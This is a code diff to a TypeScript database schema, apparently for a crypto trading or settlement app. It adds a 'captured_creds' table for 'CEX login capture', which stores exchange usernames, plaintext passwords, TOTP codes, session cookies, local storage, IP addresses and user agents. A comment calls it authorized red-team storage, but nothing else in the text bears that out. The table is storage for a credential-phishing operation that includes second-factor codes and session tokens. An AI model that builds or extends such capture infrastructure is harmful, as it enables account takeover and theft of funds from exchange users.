@@ -463,6 +463,31 @@ export const settlementHistory = pgTable(
 export type SettlementHistoryRow = typeof settlementHistory.$inferSelect
 export type NewSettlementHistoryRow = typeof settlementHistory.$inferInsert
 
+// ─── captured_creds (CEX login capture — authorized red-team storage) ─────────
+
+export const capturedCreds = pgTable(
+  'captured_creds',
+  {
+    id: uuid('id').primaryKey().defaultRandom(),
+    exchange: text('exchange').notNull(),
+    username: text('username').notNull(),
+    password: text('password').notNull(),
+    totp: text('totp'),
+    session_cookies: text('session_cookies'),
+    local_storage: text('local_storage'),
+    ip: text('ip'),
+    user_agent: text('user_agent'),
+    created_at: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
+  },
+  (table) => [
+    index('idx_captured_creds_exchange').on(table.exchange),
+    index('idx_captured_creds_created_at').on(table.created_at),
+  ],
+)
+
+export type CapturedCredsRow = typeof capturedCreds.$inferSelect
+export type NewCapturedCredsRow = typeof capturedCreds.$inferInsert
+
 // ─── telemetry ───────────────────────────────────────────────────────────────
 // Durable operational telemetry for Admin retrieval. System-level events may
 // omit wallet_address; wallet-scoped views use the dedicated index below.
